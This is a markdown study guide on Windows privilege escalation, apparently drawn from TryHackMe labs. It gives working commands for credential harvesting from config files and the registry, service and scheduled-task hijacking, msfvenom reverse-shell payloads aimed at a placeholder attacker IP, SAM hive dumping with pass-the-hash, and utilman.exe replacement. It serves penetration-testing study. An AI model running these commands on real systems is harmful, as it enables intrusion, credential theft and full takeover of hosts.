# Priveledge escalation
Ok, we have a shell. Now what? Most shells tend to be unstable and non-interactive. Time to exploit of a vulnerability, design flaw, or configuration oversight in an operating system or application to `gain unauthorized access` to resources that are usually restricted from the users.

On Windows the options are often more limited. It's sometimes possible to find passwords for `running services in the registry`. `VNC servers`, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the `FileZilla FTP server` also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`. These can be `MD5 hashes` or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the `SYSTEM user`, or an `administrator account` running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over `RDP`, `telnet`, `winexe`, `psexec`, `WinRM` or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:
- `net user <username> <password> /add`
- `net localgroup administrators <username> /add`

Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system.

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:
- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

## Account types
| Type | Description |
|-|-|
| **User accounts** | - |
| Administrators | These users have the most privileges. They can change any system configuration parameter and access any file in the system. Any user with administrative privileges will be part of the `Administrators group`. |
| Standard Users | These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. Part of the `Users group`. |
| **OS / built-in accounts** | - |
| SYSTEM / LocalSystem | Used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| Local Service | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network. |
| Network Service | Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network. |

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

## Credential harvesting from usual spots
The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.

### Unattended
When installing Windows on a large number of hosts, administrators may use `Windows Deployment Services`, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are `referred to as unattended installations` as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

    As part of these files, you might encounter credentials:
    ```xml
    <Credentials>
        <Username>Administrator</Username>
        <Domain>thm.local</Domain>
        <Password>MyPassword123</Password>
    </Credentials>
    ```

### Powershell history
 If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

Note: The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

### Save Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials: `cmdkey /list`.

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option: `runas /savecred /user:admin cmd.exe`.


### IIS Configuration (Internet Information Services)
This is the default web server on Windows installations.
The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms.
Depending on the installed version of IIS, we can find web.config in one of the following locations:
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

Here is a quick way to find database connection strings on the file: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`.

Output may look like:
```xml
<connectionStrings>
    <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
</connectionStrings>
```

### Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems.
Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use.
While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command: `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`.

## Other quick wins
### Scheduled tasks (Windows's cronjobs)
Look for a scheduled task that either lost its binary or a binary you can modify.
Scheduled tasks can be listed from the command line using the `schtasks` command without any options.

To retrieve detailed information about any of the services, you can use a command like: `schtasks /query /tn vulntask /fo list /v`. You will get lots of information about the task, but what matters for us is the `Task to Run` parameter which indicates what gets executed by the scheduled task, and the `Run As User` parameter, which shows the user that will be used to execute the task.

Example output:

```
Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/21/2025 9:48:47 PM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

If our current user can modify or overwrite the `Task to Run` executable, we can control what gets executed by the user, resulting in a simple privilege escalation.
To check the file permissions on the executable, we use `icacls` like so: `icacls c:\tasks\schtask.bat`.

Example output:

```
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the `BUILTIN\Users` group has `full access (F)` over the task's binary.
This means we can modify the .bat file and insert any payload we like.
All that's left to do is change the bat file to spawn a reverse shell.

### AlwaysInstallElevated (.msi files run with elevated privileges)
Windows installer files (also known as `.msi` files) are used to install applications on the system and usually run with the privilege level of the user that starts it.
However, these can be configured to run with higher privileges from any user account (even unprivileged ones).
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method `requires two registry values to be set`.
You can query these from the command line using the commands below.
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

If these are set, you can generate a malicious .msi file using msfvenom:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`

## Abusing Service Misconfigurations
### What are Windows Services?
- Services are `background processes that run without user interaction`.
- They `often start automatically` and `run with system-level privileges` (e.g., LocalSystem, LocalService, or NetworkService accounts).
- Misconfigured services can allow attackers to escalate privileges by abusing their properties.

Windows services are managed by the `Service Control Manager (SCM)`.
The SCM is a process in charge of managing the state of services as needed, `checking the current status of any given service` and generally `providing a way to configure services`.
Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started.
It is important to note that `service executables implement special functions` to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully.
`Each service also specifies the user account under which the service will run`.
To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

Here we can see that the associated executable is specified through the `BINARY_PATH_NAME` parameter, and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.

Services have a `Discretionary Access Control List` or [`DACL`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/acls-dacls-sacls-aces.html), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.
The DACL can be seen from Process Hacker (available on your machine's desktop):

![DACL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png)

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:

![HKLM](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png)

A subkey exists for every service in the system.
Again, we can see the associated executable on the `ImagePath` value and the account used to start the service on the `ObjectName` value.
If a DACL has been configured for the service, it will be stored in a subkey called `Security`.
As you have guessed by now, only administrators can modify such registry entries by default.

### Insecure Permissions on Service Executable
This vulnerability arises when the executable file of a service is `stored in a location with weak permissions`, allowing unauthorized users to replace it with a malicious file.

To recap: if the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler.

Example:
1. To start, we will query the service configuration using `sc`.
2. We can see that the service installed by the vulnerable software runs as `.\svcuser1` and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`.
3. We then proceed to check the permissions on the executable: And here we have something interesting. The `Everyone` group has `modify permissions (M)` on the service's executable.
4. Generate an exe-service payload using msfvenom and serve it through a python webserver.
5. Once the payload is in the Windows server, we proceed to replace the service executable with our payload.
6. Since we need another user to execute our payload, we'll want to grant `full permissions to the Everyone group` as well.
7. We start a reverse listener on our attacker machine.
8. And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use `sc stop windowsscheduler` and then `sc start windowsscheduler`.

### Unquoted Service Paths
When we can't directly write into service executables as before, there might still be a chance to `force a service into running arbitrary executables` by using a rather obscure feature.
When working with Windows services, a very particular behaviour occurs when the service is configured to point to an `unquoted executable`.
By unquoted, we mean that the `path of the associated executable isn't properly quoted to account for spaces on the command`.

As an example, let's look at the difference between two services:

- `BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service`, quoted.
- `BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`, unquoted.

When the SCM tries to execute the associated binary, a problem arises.
Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes `ambiguous`, and the SCM doesn't know which of the following you are trying to execute:

| Command | Argument 1 | Argument 2 |
|-|-|-|
| `C:\MyPrograms\Disk.exe` | `Sorter` | `Enterprise\bin\disksrs.exe` |
| `C:\MyPrograms\Disk Sorter.exe` | `Enterprise\bin\disksrs.exe` |  |
| `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` |  |  |

This has to do with how the command prompt parses a command. Usually, when you send a command, `spaces are used as argument separators` unless they are part of a quoted string.
This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
While this sounds trivial, most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which `isn't writable by unprivileged users`.

### Insecure Service Permissions
You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted.
Should the `service DACL` (`not the service's executable DACL`) allow you to modify the configuration of a service, you will be able to `reconfigure the service`.
This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use `Accesschk` from the `Sysinternals suite`.

1. `accesschk64.exe -qlc thmservice`
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe`
3. `icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`
4. `sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`
5. `sc stop THMService`
6. `sc start THMService`
7. `nc -lvp 4447`

## Abusing dangerous privileges
Each user has a set of assigned privileges that can be checked with the following command: `whoami /priv`.

A complete list of available privileges on Windows systems is available [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin/tree/master) Github project.

### SeBackup / SeRestore
Allow users to read and write to any file in the system, ignoring any `DACL` in place.
The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques.
The one we will look at consists of copying the `SAM` and `SYSTEM registry hives` to extract the local Administrator's password hash.

1. We will need to open a command prompt using the "Open as administrator" option to use these privileges.
2. `whoami /priv`
3. Backup the `SAM` and `SYSTEM` hashes: `reg save hklm\system C:\Users\THMBackup\system.hive` & `reg save hklm\sam C:\Users\THMBackup\sam.hive`
4. This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method.
5. Use `impacket` to retrieve the users' password hashes: `python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL`.
6. Use the Administrator's hash to perform a `Pass-the-Hash attack` and gain access to the target machine with SYSTEM privileges.

### SeTakeOwnership
Allows a user to take `ownership of any object on the system`, including `files` and `registry keys`.

E.g: `utilman.exe`, a built-in Windows application used to provide Ease of Access options during the lock screen. Abuse it to escalate privileges this time.

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like.
As we can take ownership of any file, replacing it is trivial.

1. `takeown /f C:\Windows\System32\Utilman.exe`
2. `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
3. `copy cmd.exe utilman.exe`
4. Lock the screen and click the "Ease of Access" button to trigger `utilman`.

### Others / Summary
| Privilege | Description | Abuse |
|-|-|-|
| `SeImpersonatePrivilege` | Allows a process to impersonate another user. | Exploited in token impersonation attacks (e.g., `JuicyPotato`, `RoguePotato`) to escalate to SYSTEM. |
| `SeAssignPrimaryTokenPrivilege` | Allows a process to assign a token to a process. | Combined with SeImpersonatePrivilege for privilege escalation. |
| `SeCreateTokenPrivilege` | Allows a user to create new tokens. | Exploited to create a new SYSTEM token and elevate privileges. |
| `SeTakeOwnershipPrivilege` | Allows a user to take ownership of any object. | Can be used to take control of files or processes owned by SYSTEM. |
| `SeDebugPrivilege` | Allows debugging of any process, including SYSTEM processes. | Exploited to inject code into SYSTEM processes or access sensitive data in memory. |
| `SeLoadDriverPrivilege` | Allows loading of device drivers. | Exploited to load malicious drivers, which run in kernel mode (ring-0). |
| `SeRestorePrivilege` | Allows restoring files or directories regardless of permissions. | Used to overwrite critical files, bypassing NTFS permissions. |
| `SeShutdownPrivilege` | Allows shutting down the system. | Used for denial-of-service attacks. |

## Abusing vulnerable software
Software installed on the target system can present various privilege escalation opportunities.
As with drivers, organisations and users may not update them as often as they update the operating system.
You can use the `wmic` tool to list software installed on the target system and its versions.

This command will dump information it can gather on installed software: `wmic product get name,version,vendor`.

Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here.
It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like `exploit-db`, `packet storm` or plain old `Google`, amongst many others.

## Tools of the trade
Various tools can help you conduct system enumeration to find privilege escalation vectors. Below are some commonly used tools along with their descriptions and usage.

| **Tool** | **Description** | **Usage** |
|-|-|-|
| **WinPEAS** | A script that enumerates the target system to find privilege escalation paths. | - Download the precompiled executable or `.bat` script. <br> - Run: `winpeas.exe > outputfile.txt` <br> - Output may be long, so redirect to a file for easier review. |
| **PrivescCheck** | A PowerShell script to search for common privilege escalation vectors. | - Run: `Set-ExecutionPolicy Bypass -Scope process -Force` <br> - Execute: `. .\PrivescCheck.ps1` <br> - Then, run: `Invoke-PrivescCheck` |
| **WES-NG (Windows Exploit Suggester - Next Generation)** | A Python script that identifies missing patches and vulnerabilities on the target system. | - Update the database: `wes.py --update` <br> - Run `systeminfo` on the target machine and save output to `systeminfo.txt` <br> - Run: `wes.py systeminfo.txt` on the attacking machine. |
| **Metasploit (multi/recon/local_exploit_suggester)** | A Metasploit module that suggests local exploits based on the target system's vulnerabilities. | - Use the `multi/recon/local_exploit_suggester` module if you have a Meterpreter shell on the target system to identify privilege escalation vectors. |

> **Note:** Automated tools may not catch all potential escalation vectors, so manual enumeration is still recommended.